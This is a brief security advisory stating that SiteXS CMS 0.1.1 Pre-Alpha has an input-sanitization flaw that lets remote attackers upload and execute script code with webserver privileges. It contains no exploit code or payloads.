SiteXS is prone to a vulnerability that lets remote attackers upload and execute arbitrary script code because the application fails to sanitize user-supplied input.

An attacker can leverage this issue to execute arbitrary code on an affected computer with the privileges of the webserver process.

SiteXS CMS 0.1.1 Pre-Alpha is vulnerable; other versions may also be affected.
